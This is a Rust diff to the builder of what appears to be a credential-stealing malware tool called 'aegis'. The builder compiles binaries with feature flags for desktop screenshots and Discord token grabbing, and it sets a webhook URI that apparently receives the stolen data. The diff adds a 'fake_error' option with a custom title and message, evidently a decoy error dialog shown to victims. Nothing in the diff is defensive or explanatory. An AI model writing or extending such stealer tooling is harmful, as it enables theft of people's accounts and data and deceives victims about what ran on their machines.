@@ -1,7 +1,16 @@
 use std::process::Command;
 mod utils;
 
-pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: String) {
+pub fn build_binary(
+    ds: bool,
+    gc: bool,
+    gt: bool,
+    gdt: bool,
+    fake_error: bool,
+    fe_title: &str,
+    fe_msg: &str,
+    webhook_uri: String,
+) {
     let mut features = Vec::new();
     if ds {
         features.push("aegis/desktop_screenshot");
@@ -15,6 +24,9 @@ pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: String
     if gdt {
         features.push("aegis/grab_discord_token");
     }
+    if fake_error {
+        features.push("aegis/fake_error");
+    }
 
     let mut cmd = Command::new("cargo");
 
@@ -26,6 +38,10 @@ pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: String
         .arg(features.join(" "));
 
     cmd.env("WEBHOOK_URI", webhook_uri);
+    if fake_error {
+        cmd.env("FE_TITLE", fe_title);
+        cmd.env("FE_MSG", fe_msg);
+    }
 
     let status = cmd.status().unwrap();
 
@@ -38,4 +54,8 @@ pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: String
 
 pub async fn send() {
     utils::send::send_hook().await;
+}
+
+pub async fn show_error(title: &str, msg: &str) {
+    utils::fake_error::show_error(title, msg).await;
 }
